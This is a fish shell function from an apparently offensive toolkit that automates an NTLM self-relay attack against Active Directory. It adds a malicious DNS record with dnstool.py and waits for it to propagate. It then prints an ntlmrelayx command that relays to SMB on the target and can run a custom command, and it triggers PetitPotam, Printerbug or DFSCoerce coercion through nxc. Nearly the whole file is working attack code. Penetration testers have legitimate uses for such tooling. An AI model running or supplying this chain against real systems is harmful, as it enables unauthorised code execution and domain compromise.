function _ezpz_selfrelay
    source "$EZPZ_HOME/functions/_ezpz_colors.fish"
    
    set -l STATIC_DNS_RECORD "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
    
    set -l options 't/target=' 'u/user=' 'p/pass=' 'k/kerberos' 'd/domain=' 'l/listener=' 'dns=' 'm/method=' 'x/cmd=' 'modify' 'h/help'
    
    if not argparse $options -- $argv
        return 1
    end
    
    if set -q _flag_help
        ezpz_header "selfrelay - NTLM Self-Relay Attack Chain"
        echo
        echo "Description:"
        echo "  Performs NTLM self-relay attack using DNS poisoning and coercion techniques"
        echo
        echo "Usage:"
        echo "  ezpz selfrelay -t <target> -u <user> -p <pass> [-k] -d <domain> -l <listener> --dns <dns_server> [-m <method>] [-x <cmd>]"
        echo
        echo "Required:"
        echo "  -t, --target     Target machine FQDN for NTLM relay"
        echo "  -u, --user       Username for authentication"
        echo "  -p, --pass       Password for authentication"
        echo "  -d, --domain     Domain name"
        echo "  -l, --listener   Attacker listener IP"
        echo "  --dns            DNS server IP (Domain Controller)"
        echo
        echo "Optional:"
        echo "  -k, --kerberos   Use Kerberos authentication"
        echo "  -m, --method     Coercion method (PetitPotam, Printerbug, DFSCoerce, ALL) [default: ALL]"
        echo "  -x, --cmd        Custom command to execute"
        echo "  --modify         Use modify action instead of add for DNS record"
        echo "  -h, --help       Show this help message"
        echo
        return 0
    end
    
    if not set -q _flag_target; or not set -q _flag_user; or not set -q _flag_pass; or not set -q _flag_domain; or not set -q _flag_listener; or not set -q _flag_dns
        ezpz_error "Missing required arguments. Use --help for usage information"
        return 1
    end
    
    set -l target $_flag_target
    set -l user $_flag_user
    set -l pass $_flag_pass
    set -l domain $_flag_domain
    set -l listener $_flag_listener
    set -l dns_server $_flag_dns
    set -l method ""
    set -l cmd ""
    
    if set -q _flag_method
        set method $_flag_method
    end
    
    if set -q _flag_cmd
        set cmd $_flag_cmd
    end
    
    ezpz_title "Starting NTLM Self-Relay Attack Chain"
    echo
    
    # Check prerequisites silently
    for tool in dnstool.py dig nxc
        if not command -q $tool
            ezpz_error "Missing required tool: $tool"
            return 1
        end
    end
    
    # Step 1: Add DNS record
    set -l dns_action "add"
    if set -q _flag_modify
        set dns_action "modify"
    end
    
    ezpz_header (string upper (string sub -s 1 -l 1 $dns_action))(string sub -s 2 $dns_action)"ing malicious DNS record"
    set -l dnstool_args "-u" "$domain\\$user" "-p" "$pass" "-a" "$dns_action" "-r" "$STATIC_DNS_RECORD" "-d" "$listener" "$dns_server"
    
    if set -q _flag_kerberos
        set dnstool_args $dnstool_args "-k"
    end
    
    ezpz_cmd "dnstool.py $dnstool_args"
    dnstool.py $dnstool_args 2>&1 | grep -oE [A-Z].+
    echo
    
    # Step 2: Check DNS propagation
    ezpz_header "Checking DNS record propagation"
    set -l full_record "$STATIC_DNS_RECORD.$domain"
    
    ezpz_info "Waiting for DNS record $full_record to propagate..."
    ezpz_cmd "dig +short $full_record @$dns_server"
    set -l timeout 60
    set -l start_time (date +%s)
    set -l record_found 0
    
    while test (math (date +%s) - $start_time) -lt $timeout
        set -l dig_result (dig +short $full_record @$dns_server 2>/dev/null)
        if test -n "$dig_result"; and not string match -q "*error*" $dig_result; and not string match -q "*no servers*" $dig_result
            ezpz_success "DNS record is live: $dig_result"
            set record_found 1
            break
        end
        sleep 2
    end
    
    if test $record_found -eq 0
        ezpz_error "Timeout reached. DNS record not found"
        return 1
    end
    echo
    
    # Step 3: Prepare ntlmrelayx
    ezpz_error "To proceed, start ntlmrelayx on another terminal:"
    set -l ntlmrelayx_cmd "sudo ntlmrelayx.py -t smb://$target -smb2support"
    if test -n "$cmd"
        set ntlmrelayx_cmd "$ntlmrelayx_cmd -c '$cmd'"
    end
    ezpz_cmd "$ntlmrelayx_cmd"
   
    while true
        ezpz_question "Proceed with coercion attack? [y/n]: "
        read -l response
        switch $response
            case y Y yes YES
                break
            case n N no NO
                ezpz_warn "Attack cancelled by user"
                return 0
            case '*'
                continue
        end
    end
    echo
    
    # Step 4: Execute coercion
    set -l nxc_args ""
    if set -q _flag_method
        ezpz_header "Triggering $method coercion"
        set nxc_args "smb" "$target" "-u" "$user" "-p" "$pass" "-d" "$domain" "-M" "coerce_plus" "-o" "LISTENER=$STATIC_DNS_RECORD" "M=$method"
    else
        ezpz_header "Triggering coercion attacks"
        set nxc_args "smb" "$target" "-u" "$user" "-p" "$pass" "-d" "$domain" "-M" "coerce_plus" "-o" "LISTENER=$STATIC_DNS_RECORD"
    end
  
    ezpz_cmd "nxc $nxc_args"
    nxc $nxc_args | grep "COERCE" | tr -s " " | cut -d " " -f 5-
    
    echo
    
    ezpz_success "Self-relay attack chain completed"
    ezpz_info "Check your ntlmrelayx terminal for results"
end